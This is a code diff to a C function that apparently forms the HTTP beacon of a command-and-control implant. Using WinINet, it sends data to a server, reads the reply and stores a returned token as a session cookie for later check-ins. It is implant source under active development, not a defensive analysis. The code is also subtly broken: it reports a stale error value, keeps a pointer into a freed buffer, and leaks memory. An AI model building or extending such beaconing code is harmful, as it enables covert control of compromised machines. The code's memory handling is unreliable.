@@ -111,9 +111,13 @@ void http_request() {
     HINTERNET h_internet;
     HINTERNET h_connect;
     HINTERNET h_request;
-    CHAR* response = NULL;
-    //CHAR* query_buffer = NULL;
     DWORD dw_error = GetLastError();
+
+    CHAR* query_buffer = NULL;
+    CHAR* response = NULL;
+    DWORD read_buffer;
+    DWORD buffer_length = 0;
+    DWORD available_size = 0;
 
     log_debug("Sending request for %d", data.status);
     beacon.count++;
@@ -129,16 +133,46 @@ void http_request() {
         goto cleanup;
     } else {
         HttpAddRequestHeadersA(h_request, data.length, -1, HTTP_ADDREQ_FLAG_ADD);
-        HttpSendRequestA(h_request, 0, 0, data.buffer, data.size);
+        if (HttpSendRequestA(h_request, 0, 0, data.buffer, data.size) == FALSE) {
+            log_error("Error: %lu\n", dw_error);
+            goto cleanup;
+        }
 
         log_debug("Request sent");
-    }
 
-    goto process_response;
+        BOOL available = InternetQueryDataAvailable(h_request, &available_size, 0, 0);
+        if (available == FALSE || available_size == 0) {
+            log_error("Error: %lu\n", dw_error);
+            goto cleanup;
+        }
+
+        query_buffer = (CHAR*)realloc(query_buffer, available_size + 1);
+        memset(query_buffer, 0, available_size + 1);
+
+        BOOL value = InternetReadFile(h_request, query_buffer, available_size, &read_buffer);
+        if (value == FALSE || read_buffer == 0) {
+            log_error("Error: %lu\n", dw_error);
+            goto cleanup;
+        }
+
+        buffer_length += read_buffer;
+        response = (CHAR*)realloc(response, buffer_length + 1);
+        sprintf_s(response, buffer_length + 1, "%s\0", query_buffer);
+
+        log_debug("Response: %s", response);
+        
+        goto process_response;
+    }
 
     process_response:
         if (beacon.count <= 1) {
-            goto cleanup;
+            CHAR* token = strtok(response, " ");
+
+            if (strtok(NULL, " ") == NULL && strlen(response) == 20) {
+                auth.cookie = token;
+            } else {
+                log_error("Unknown response");
+            }
         } else {
             goto cleanup;
         }
@@ -146,9 +180,9 @@ void http_request() {
     cleanup:
         free(data.buffer);
         free(response);
-        //InternetCloseHandle(h_internet);
-        //InternetCloseHandle(h_connect);
-        //InternetCloseHandle(h_request);
+        InternetCloseHandle(h_internet);
+        InternetCloseHandle(h_connect);
+        InternetCloseHandle(h_request);
 }
 
 void agent_beacon() {
